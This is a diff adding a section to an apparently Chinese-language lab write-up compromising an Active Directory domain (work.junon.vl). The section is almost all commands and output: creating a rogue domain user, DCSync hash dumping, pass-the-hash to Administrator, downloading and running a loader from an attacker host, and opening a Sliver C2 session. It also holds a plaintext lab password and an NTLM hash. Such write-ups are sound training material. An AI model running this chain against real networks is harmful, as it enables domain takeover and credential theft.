@@ -1107,3 +1107,180 @@ ACCOUNT OPERATORS
 
 ## <span style="color:lightblue">Account Operators, Trust Enumeration & Password Reuse</span>
 
+```bash
+proxychains4 -q bloodhound-python -c all --disable-pooling -w 1 -u "HD-FSTEWART" -p 'DEQ8mC2xxTzVNB' -d work.junon.vl -dc dc.work.junon.vl -ns 172.16.21.200 --dns-tcp --zip
+```
+
+```bash
+proxychains4 -q rpcclient 172.16.21.200 -U WORK.JUNON.VL\\HD-FSTEWART
+
+rpcclient $> createdomuser fsociety
+rpcclient $> setuserinfo2 fsociety 24 p-0p-0p-0
+
+
+user:[fsociety] rid:[0x13ed]
+rpcclient $> enumdomusers
+
+
+```
+登录kasm Workspaces runasHD-FSTEWART
+```powershell
+C:\fsociety>runas /user:WORK.JUNON.VL\HD-FSTEWART cmd
+
+C:\Windows\system32>whoami
+work-junon\hd-fstewart
+```
+
+```powershell
+C:\Windows\system32>net user fsociety /domain
+The request will be processed at a domain controller for domain work.junon.vl.
+
+User name                    fsociety
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               No
+Account expires              Never
+
+Password last set            11/4/2023 3:41:35 AM
+Password expires             12/16/2023 3:41:35 AM
+Password changeable          11/5/2023 3:41:35 AM
+Password required            No
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
+
+```
+Account active               No
+```
+
+```powershell
+net user fsociety /domain /active:yes
+```
+
+```powershell
+net group "PASSWORD-AUDIT" fsociety /add /domain
+
+C:\Windows\system32>net user fsociety /domain
+The request will be processed at a domain controller for domain work.junon.vl.
+
+User name                    fsociety
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            11/4/2023 3:41:35 AM
+Password expires             12/16/2023 3:41:35 AM
+Password changeable          11/5/2023 3:41:35 AM
+Password required            No
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *Password-Audit
+The command completed successfully.
+```
+
+![](/assets/post_img/2023-11-04%20184817_Wutai_PASSWORD_AUDITWORK_JUNON_VL.png)
+
+DCSYNC
+```bash
+proxychains4 -q impacket-secretsdump -just-dc fsociety:'p-0p-0p-0'@172.16.21.200 -outputfile work_junon.hashes
+```
+
+```bash
+cat work_junon.hashes.ntds|grep -i administrator
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b976dde1bcbbf31cbdab60d2a5a5449d:::
+```
+
+```bash
+proxychains4 -q impacket-wmiexec administrator@172.16.21.200 -hashes :b976dde1bcbbf31cbdab60d2a5a5449d
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+work-junon\administrator
+
+C:\>mkdir fsociety
+
+C:\>cd fsociety
+C:\fsociety>powershell -c "iwr http://10.8.0.227:8000/Loaders.exe -usebasicparsing -outfile fsociety.exe"
+
+C:\fsociety>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9264-EECF
+
+ Directory of C:\fsociety
+
+11/04/2023  04:15 AM    <DIR>          .
+11/04/2023  04:16 AM        11,140,608 fsociety.exe
+               1 File(s)     11,140,608 bytes
+               1 Dir(s)  18,115,579,904 bytes free
+
+C:\fsociety>fsociety.exe
+```
+
+```bash
+ f1eb9b58   wutai-http   http(s)     S021M005   WORK-JUNON\Administrator   windows/amd64      13s             17s
+
+[server] sliver > use f1eb9b58-9051-4d91-bdcf-58156419023e
+
+[*] Active beacon wutai-http (f1eb9b58-9051-4d91-bdcf-58156419023e)
+
+[server] sliver (wutai-http) > interactive
+
+[*] Using beacon's active C2 endpoint: https://10.8.0.227?driver=wininet
+[*] Tasked beacon wutai-http (c68b727c)
+
+[*] Session 2b3e6e95 wutai-http - 172.16.20.2:54217 (S021M005) - windows/amd64 - Sat, 04 Nov 2023 07:11:02 EDT
+
+[server] sliver (wutai-http) > use 2b3e6e95-18b6-4c58-be9d-cc25cabe5c47
+
+[*] Active session wutai-http (2b3e6e95-18b6-4c58-be9d-cc25cabe5c47)
+
+[server] sliver (wutai-http) > info
+
+        Session ID: 2b3e6e95-18b6-4c58-be9d-cc25cabe5c47
+              Name: wutai-http
+          Hostname: S021M005
+              UUID: 31a54d56-f302-6f44-50bb-81f49a517687
+          Username: WORK-JUNON\Administrator
+               UID: S-1-5-21-1112787665-3955584987-2510362858-500
+               GID: S-1-5-21-1112787665-3955584987-2510362858-513
+               PID: 6080
+                OS: windows
+           Version: Server 2016 build 20348 x86_64
+            Locale: en-US
+              Arch: amd64
+         Active C2: https://10.8.0.227?driver=wininet
+    Remote Address: 172.16.20.2:54217
+         Proxy URL:
+Reconnect Interval: 1m0s
+     First Contact: Sat Nov  4 07:11:02 EDT 2023 (5s ago)
+      Last Checkin: Sat Nov  4 07:11:06 EDT 2023 (1s ago)
+```
+
